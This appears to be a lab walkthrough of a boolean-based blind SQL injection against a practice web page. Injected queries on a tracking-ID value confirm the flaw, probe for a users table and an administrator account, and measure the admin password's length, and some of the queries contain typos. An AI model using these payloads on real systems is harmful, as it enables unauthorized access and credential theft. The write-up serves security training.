Now we are going to conduct a Blind SQL Injection Attack on a vulnerable webpage

![image](https://user-images.githubusercontent.com/65653010/235386592-49967108-55ce-4e60-bf02-e6fb9af5ccb3.png)

To confirm that the parameter is vulnerable to blind SQL Injection we perform the query:

SELECT tracking-id FROM tracking-table WHERE trackingid='UooqxXf9ASLn57ZY' AND 1=1--

![image](https://user-images.githubusercontent.com/65653010/235389559-58017cb4-d22b-4ac7-a9c7-11644004bd09.png)

As the query is true, we find the response as 'Welcome back' Message

Now we give a false query

SELECT tracking-id FROM tracking-table WHERE trackingid='UooqxXf9ASLn57ZY' AND 1=2--

![image](https://user-images.githubusercontent.com/65653010/235389602-a3ea3098-1c54-4d12-b61c-cb47cc641b54.png)

As the query is false, we did not get a 'Welcome back' message

Now we verify thet there is a users table 

![image](https://user-images.githubusercontent.com/65653010/235390075-b07a747d-2db0-4433-9dc3-d56c3692593b.png)

As the response is a 'Welcome back' message, the users table is present and confirmed

Now let us confirm that username administrator exists users table

![image](https://user-images.githubusercontent.com/65653010/235391224-db855638-7ce5-4db1-b9e8-ec6f97adcd05.png)

Now we have confirmed it

Now we determine the length of the password by giving query

SELECT tracking-id FROM tracking-table WHERE TrackingId='UooqxXf9ASLn57ZY' ANS (SELECT USERNAME FROM USERS WHERE USERNAME='administrator' AND LENGTH(password)>1='a'--'

![image](https://user-images.githubusercontent.com/65653010/235393882-1be72594-e74e-4d40-9a30-0e20ddd0c9fd.png)

As it shows a 'Welcome Back' message it shows that the password length is greater than 1

Now if we perform the query

SELECT tracking-id FROM tracking-table WHERE TrackingId='UooqxXf9ASLn57ZY' ANS (SELECT USERNAME FROM USERS WHERE USERNAME='administrator' AND LENGTH(password)>20='a'--'

![image](https://user-images.githubusercontent.com/65653010/235394052-0d8741e2-73d7-471a-9169-e71e31a54fc3.png)

The response shows no 'Welcome Back' message, the password length is exactly 20

Now we determine the password by checking each character with each position.

![image](https://user-images.githubusercontent.com/65653010/235406926-92f62818-b7eb-40cd-978e-96c421c8c1da.png)
